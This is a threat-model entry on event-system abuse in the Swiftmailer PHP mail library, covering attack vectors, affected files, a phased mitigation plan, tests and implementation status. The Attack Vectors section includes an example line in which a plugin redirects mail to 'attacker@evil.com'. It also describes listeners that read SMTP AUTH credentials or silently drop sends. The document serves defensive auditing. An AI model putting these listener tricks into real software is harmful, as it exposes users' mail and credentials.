# Threat 15: Event System Abuse and Plugin-Mediated Attacks

**STRIDE Category:** Tampering, Information Disclosure, Denial of Service
**Severity:** MEDIUM
**Likelihood:** Medium
**CWE:** CWE-284 (Improper Access Control), CWE-471 (Modification of Assumed-Immutable Data)

---

## Description

The event system allows registered listeners to silently cancel sends, suppress exceptions, redirect messages to arbitrary recipients, and leak credential data. Events carry mutable references to messages and envelopes, and there is no access control on listener registration, no ordering guarantees, and no audit trail for event-driven modifications.

## Attack Vectors

1. **Silent send cancellation** -- Any `SendListener` can call `$evt->cancelBubble(true)` in `beforeSendPerformed`, silently dropping all outbound mail. The transport returns 0 with no logging.
2. **Recipient redirection via mutable events** -- `SendEvent::getMessage()` returns a mutable reference. A listener calls `$evt->getMessage()->setTo(['attacker@evil.com'])` or `$evt->setEnvelope(...)` to reroute mail.
3. **Exception suppression** -- `exceptionThrown` event listeners can call `cancelBubble(true)` to swallow transport exceptions, masking TLS failures, auth errors, and delivery failures.
4. **Transport stop prevention** -- If a `beforeTransportStopped` listener cancels the bubble, `stop()` returns without setting `$started = false`. The transport cannot be stopped, preventing cleanup.
5. **SMTP command/response exposure** -- `CommandEvent` and `ResponseEvent` expose raw SMTP dialogue (including AUTH credentials) to all `CommandListener` and `ResponseListener` plugins.
6. **Cross-transport event leakage** -- When a single dispatcher is shared, listeners bound for one transport receive events from all transports.
7. **No listener priority** -- No mechanism to guarantee security-critical listeners (rate limiters, allowlists) run before other plugins.

## Affected Files

| File | Risk |
|-|-|
| `lib/classes/Swift/Events/SendEvent.php:98-121,146-149` | Mutable state, bubble cancellation |
| `lib/classes/Swift/Events/SimpleEventDispatcher.php:129-136` | No ordering, no access control |
| `lib/classes/Swift/Transport/AbstractSmtpTransport.php:197-202` | Reads envelope from event post-dispatch |
| `lib/classes/Swift/Transport/AbstractApiTransport.php:112-122` | Exception suppression via bubble cancel |
| `lib/classes/Swift/Events/CommandEvent.php:50` | Raw SMTP command exposure |
| `lib/classes/Swift/Events/ResponseEvent.php:50` | Raw SMTP response exposure |
| `lib/classes/Swift/DependencyContainer.php:317-327` | Arbitrary class instantiation |
| `lib/classes/Swift/DependencyContainer.php:311-313` | Alias cycle stack overflow |

## Existing Controls

- Events carry their `$source` transport reference for listener self-filtering
- Transport `registerPlugin()` accepts only `EventListener` implementations
- `SendEvent::reject()` explicitly sets result to `RESULT_REJECTED`

## Mitigation Plan

### Phase 1: Immutable Critical Data (Immediate)
- Clone the envelope in `SendEvent` before dispatch so listeners cannot redirect recipients:
  ```php
  // In AbstractSmtpTransport::send():
  $envelope = clone $envelope; // protect original
  $evt = $this->eventDispatcher->createSendEvent($this, $message, $envelope);
  ```
- Make `SendEvent::setEnvelope()` protected or remove it

### Phase 2: Exception Suppression Logging (Short-term)
- In `throwException()`, log the exception unconditionally before checking bubble cancellation:
  ```php
  protected function throwException(Swift_TransportException $e): void
  {
      // Always log, even if bubble is cancelled
      error_log('Swiftmailer transport exception: ' . $e->getMessage());
      // ... existing bubble logic
  }
  ```
- Consider removing bubble cancellation from `exceptionThrown` events entirely

### Phase 3: Credential Redaction in Events (Short-term)
- Redact AUTH commands in `CommandEvent` before dispatch:
  ```php
  if (preg_match('/^AUTH\s/i', $command)) {
      $command = 'AUTH [REDACTED]';
  }
  ```

### Phase 4: DependencyContainer Hardening (Medium-term)
- Add alias cycle detection with a maximum depth counter (e.g., 10)
- Validate class names against an allowlist or prefix (`Swift_`) before instantiation
- Consider making the container immutable after initial configuration

### Phase 5: Listener Priority (Long-term)
- Add optional priority parameter to `bindEventListener()`:
  ```php
  public function bindEventListener(Swift_Events_EventListener $listener, int $priority = 0): void
  ```
- Security-critical listeners (AllowlistPlugin, rate limiters) register at high priority

## Test Cases

```php
// Event listener should not be able to modify original envelope
$originalTo = $envelope->getTo();
$transport->registerPlugin(new MaliciousPlugin()); // tries to change envelope
$transport->send($message, $envelope);
$this->assertSame($originalTo, $envelope->getTo());

// Suppressed exceptions should still be logged
$transport->registerPlugin(new ExceptionSwallower());
// Trigger auth failure
// Assert error_log was called

// Alias cycle should throw, not stack overflow
$container->register('a')->asAliasOf('b');
$container->register('b')->asAliasOf('a');
$this->expectException(Swift_DependencyException::class);
$container->lookup('a');
```

## Implementation Status (2026-03-02)

| Mitigation | Status | Evidence |
|-|-|-|
| Events carry `$source` transport reference | **EXISTING** | `SendEvent` includes source for listener filtering |
| `registerPlugin()` type enforcement | **EXISTING** | Only `EventListener` implementations accepted |
| `SendEvent::reject()` explicit rejection | **EXISTING** | Sets `RESULT_REJECTED` |
| Immutable envelope in SendEvent | **NOT DONE** | `SendEvent.php:174`: `setEnvelope()` is public; no envelope cloning |
| Bubble cancellation still allows send suppression | **NOT DONE** | `SendEvent.php:149`: `cancelBubble(true)` callable by any listener |
| Exception suppression logging | **NOT DONE** | Exceptions can be silently swallowed via bubble cancellation |
| AUTH command redaction in CommandEvent | **NOT DONE** | Raw SMTP commands exposed to all `CommandListener` plugins |
| DependencyContainer alias cycle detection | **NOT DONE** | No maximum depth counter; potential stack overflow |
| DependencyContainer class name allowlist | **NOT DONE** | Arbitrary class instantiation possible |
| Listener priority ordering | **NOT DONE** | No priority parameter on `bindEventListener()` |

**Overall Status:** NOT STARTED -- All proposed mitigations remain pending. The event system allows recipient redirection, silent send cancellation, and exception suppression.

## Risk After Mitigation

**Residual Risk:** LOW -- With immutable envelopes, mandatory exception logging, credential redaction, and cycle detection, the event system cannot be silently abused.
